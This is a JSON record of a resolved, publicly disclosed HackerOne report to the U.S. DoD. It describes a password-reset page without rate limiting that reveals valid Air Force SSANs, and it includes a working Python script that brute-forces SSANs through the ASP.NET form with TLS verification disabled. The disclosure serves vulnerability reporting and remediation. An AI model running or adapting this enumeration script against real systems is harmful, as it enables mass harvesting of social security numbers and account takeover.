@@ -1,0 +1,118 @@
+{
+  "id": 2748003,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzQ4MDAz",
+  "url": "https://hackerone.com/reports/2748003",
+  "title": "Lack of rate limiting in https://███/PKI/PassReset.aspx leads to PII disclosure and potential account takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2024-09-29T13:44:30.074Z",
+  "submitted_at": "2024-09-29T13:44:30.224Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hypervis0r",
+    "url": "/hypervis0r",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qmedpqhup353hxtwz1ouk26tgocd/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-10-25T16:05:12.582Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-10-10T04:40:44.827Z",
+  "team_member_agreed_on_going_public_at": "2024-10-25T16:05:12.274Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The password reset functionality of AFPC Secure is intended to be used by users who do not have a PKI credential for AFPC secure. It allows a user to provide their SSAN and Mother's Maiden Name to reset their password. The issue lies in the fact that if an SSAN for a user with an active PKI credential is found, the system will inform the user of that fact with the following error message:\n```\nYour account was found, but our records indicate you are either Military, Civilian, or a Contractor with a CAC, which you must use to reset your password. For more information, please click the link above labeled \"Help with accessing AFPCSecure using a CAC\"\n```\n\nAdditionally, there is no rate limiting done for this site, meaning an attacker can brute force through approximately 772,000,000 social security numbers to find SSANs for active U.S. Air Force personnel. Furthermore, if any SSANs are found that aren't tied to active PKI credentials (i.e. authorized UserId/Password users, POW-MIA Next of Kin users), an attacker could potentially trigger a password reset by brute forcing the mother's maiden name field (for example, going through most common last names).\n\nPlease see the steps to reproduce for a proof-of-concept script that brute forces SSANs with the password reset functionality.\n\n## Impact\n\nThis vulnerability can lead to the exposure of personally identifiable information for U.S. Air Force personnel, and can potentially lead to an account takeover in the right circumstances.\n\n## System Host(s)\n███\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\nSee the following Python script for a proof-of-concept. The script will brute force through 772,000,000 SSANs by default, you can adjust the minimum and maximum search range on line 87. Uncomment line 84 to do a single SSAN search.\n\n```python\nimport requests\nfrom tqdm import tqdm\nfrom bs4 import BeautifulSoup\nimport urllib\nimport urllib3\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Get all the hidden ASP.NET inputs\ndef __get_hidden_input(content):\n    \"\"\" Return the dict contain the hidden input \n    \"\"\"\n    tags = dict()\n    soup =BeautifulSoup(content, 'html.parser')\n    hidden_tags = soup.find_all('input', type='hidden')\n    # print(*hidden_tags)\n    for tag in hidden_tags:\n        tags[tag.get('name')] = tag.get('value')\n    \n    return tags\n\nurl = \"https://█████\"\n\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36\"}\n\nsession = requests.Session()\n\n# Simulate ASP.NET post back function\ndef doPostBack(url, data):\n    resp = session.get(url, headers=headers, verify=False)\n    asp_info = __get_hidden_input(resp.text)\n\n    asp_info.update(data)\n\n    return session.post(url,  data=asp_info, headers=headers, verify=False)\n\n# Click check portal button\ndata = {\"btnOK\": \"OK\"}\nresp = doPostBack(url + \"/CheckPortal.aspx\", data)\n\n# Go to forgot password page\ndata = {\"__EVENTTARGET\": \"ctl00$cphPage$btnForgotPassword\"}\nresp = doPostBack(url + \"/PKI/default.aspx\", data)\n\n# Go to password reset page\ndata = {\"ctl00$cphPage$btnPOW\": \"Online Password Reset\"}\nresp = doPostBack(url + \"/PKI/PassReset1.aspx\", data)\nprint(resp.text)\n\n# Get the ASP.NET inputs for the password reset page\nasp_info = __get_hidden_input(resp.text)\n\ndef range_search(min=0, max=772000000):\n    for ssan in tqdm(range(min, max)):\n        data = asp_info\n        data[\"ctl00$cphPage$txtSSAN\"] = str(ssan).zfill(9)\n        data[\"ctl00$phPage$txtMMN\"] = \"NONEXISTANT\"\n        data[\"ctl00$cphPage$btnSubmit\"] = \"Submit\"\n\n        resp = session.post(url + \"/PKI/PassReset.aspx\", data=data, verify=False, allow_redirects=False)\n\n        if resp.status_code != 200:\n            print(f\"!! Error, resp code {resp.status_code}\\n{resp.text}\")\n\n        if (\"SSAN Does not match a ssan in our records.\" not in resp.text):\n            print(f\"[+] Found potential SSAN: {str(ssan).zfill(9)}\")\n\ndef single_search(ssan):\n    data = asp_info\n    data[\"ctl00$cphPage$txtSSAN\"] = str(ssan).zfill(9)\n    data[\"ctl00$phPage$txtMMN\"] = \"NONEXISTANT\"\n    data[\"ctl00$cphPage$btnSubmit\"] = \"Submit\"\n\n    resp = session.post(url + \"/PKI/PassReset.aspx\", data=data, verify=False, allow_redirects=False)\n    \n    print(resp.text)\n\n    if resp.status_code != 200:\n        print(f\"!! Error, resp code {resp.status_code}\\n{resp.text}\")\n\n    if (\"SSAN Does not match a ssan in our records.\" not in resp.text):\n        print(f\"[+] Found potential SSAN: {str(ssan).zfill(9)}\")\n\n# Single search, provide SSAN to test\n#single_search(555001337)\n\n# Range search, specify min/max to set range\nrange_search()\n```\n\n## Suggested Mitigation/Remediation Actions\nImplement a rate limit for https://███████/. Additionally, adjust the error message to not give out more information than necessary.\n\n",
+  "weakness": {
+    "id": 82,
+    "name": "Information Exposure Through an Error Message"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 98,
+  "voters": [
+    "br0x1337",
+    "orange303",
+    "k0ns0l",
+    "lones",
+    "almuntadhar0x01",
+    "exec_iq",
+    "arcane_xa72",
+    "see_my_twitter_x",
+    "thalaivar304",
+    "ahmed_xyz",
+    "and 88 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
